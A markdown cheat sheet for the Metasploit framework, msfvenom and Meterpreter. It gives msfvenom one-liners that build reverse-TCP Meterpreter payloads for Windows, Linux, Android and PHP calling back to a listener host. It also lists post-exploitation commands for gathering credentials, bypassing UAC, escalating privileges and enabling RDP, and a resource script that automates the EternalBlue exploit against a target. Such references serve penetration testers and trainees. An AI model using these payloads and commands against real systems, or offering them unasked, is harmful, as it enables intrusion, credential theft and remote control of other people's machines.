```markdown
# Metasploit, Msfvenom, and Meterpreter Command Cheat Sheet

## Table of Contents
- [Metasploit Framework Commands](#metasploit-framework-commands)
- [Msfvenom Payload Generation](#msfvenom-payload-generation)
- [Meterpreter Commands](#meterpreter-commands)
- [Post-Exploitation Modules](#post-exploitation-modules)
- [Resource Scripts](#resource-scripts)

## Metasploit Framework Commands

### Basic Commands
| Command | Description | Example |
|---------|-------------|---------|
| `msfconsole` | Start the Metasploit Framework | `msfconsole` |
| `search` | Search for modules | `search type:exploit platform:windows` |
| `use` | Select a module | `use exploit/windows/smb/ms17_010_eternalblue` |
| `info` | Show module information | `info` |
| `show options` | Display module options | `show options` |
| `show payloads` | Show compatible payloads | `show payloads` |
| `show targets` | Show supported targets | `show targets` |
| `show advanced` | Show advanced options | `show advanced` |

### Configuration Commands
| Command | Description | Example |
|---------|-------------|---------|
| `set` | Set an option | `set RHOSTS 192.168.1.1` |
| `setg` | Set a global option | `setg LHOST 192.168.1.5` |
| `unset` | Unset an option | `unset RHOSTS` |
| `unsetg` | Unset a global option | `unsetg LHOST` |
| `get` | Get the value of an option | `get RHOSTS` |
| `getg` | Get a global option value | `getg LHOST` |

### Execution Commands
| Command | Description | Example |
|---------|-------------|---------|
| `run`/`exploit` | Execute the module | `exploit` |
| `check` | Check if target is vulnerable | `check` |
| `back` | Exit the current module | `back` |
| `sessions` | Manage sessions | `sessions -l` |
| `jobs` | Manage background jobs | `jobs -l` |

## Msfvenom Payload Generation

### Basic Usage
| Command | Description | Example |
|---------|-------------|---------|
| `-p` | Specify payload | `-p windows/meterpreter/reverse_tcp` |
| `-f` | Output format | `-f exe` |
| `-o` | Output file | `-o payload.exe` |
| `-e` | Encoder | `-e x86/shikata_ga_nai` |
| `-i` | Iterations | `-i 5` |
| `-a` | Architecture | `-a x64` |
| `--platform` | Target platform | `--platform windows` |

### Common Payload Examples
```bash
# Windows reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o payload.exe

# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o payload.elf

# Android payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -o payload.apk

# Web payload (PHP)
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o payload.php
```

## Meterpreter Commands

### Core Commands
| Command | Description |
|---------|-------------|
| `help` | Show help menu |
| `background` | Background current session |
| `exit` | Terminate session |
| `sysinfo` | Show system information |
| `getuid` | Show current user |

### File System Commands
| Command | Description |
|---------|-------------|
| `cd` | Change directory |
| `pwd` | Print working directory |
| `ls` | List files |
| `upload` | Upload file |
| `download` | Download file |
| `edit` | Edit file |
| `cat` | View file contents |
| `rm` | Delete file |

### System Commands
| Command | Description |
|---------|-------------|
| `shell` | Get system shell |
| `execute` | Execute command |
| `getpid` | Get current process ID |
| `getprivs` | Get current privileges |
| `getsystem` | Attempt privilege escalation |
| `reboot` | Reboot system |
| `shutdown` | Shutdown system |

### Network Commands
| Command | Description |
|---------|-------------|
| `ipconfig`/`ifconfig` | Network interfaces |
| `portfwd` | Port forwarding |
| `route` | View/modify routing table |

### Privilege Escalation
| Command | Description |
|---------|-------------|
| `getsystem` | Attempt to get SYSTEM |
| `bypassuac` | Bypass UAC |
| `run post/windows/escalate/*` | Various escalation modules |

## Post-Exploitation Modules

### Windows Modules
```bash
run post/windows/gather/credentials
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
run post/windows/manage/enable_rdp
```

### Linux Modules
```bash
run post/linux/gather/enum_system
run post/linux/gather/checkvm
run post/linux/gather/enum_configs
```

### Multi Modules
```bash
run post/multi/recon/local_exploit_suggester
run post/multi/manage/autoroute
run post/multi/manage/shell_to_meterpreter
```

## Resource Scripts
```bash
# Create a resource file
echo "use exploit/windows/smb/ms17_010_eternalblue" > auto.rc
echo "set RHOSTS 192.168.1.1" >> auto.rc
echo "exploit" >> auto.rc

# Run the resource script
msfconsole -r auto.rc
```

## Notes
- For the most current commands, always check the built-in help (`help` in msfconsole or meterpreter)
- Many commands have additional options (use `-h` to see them)
- Meterpreter commands may vary slightly between different payload types

```
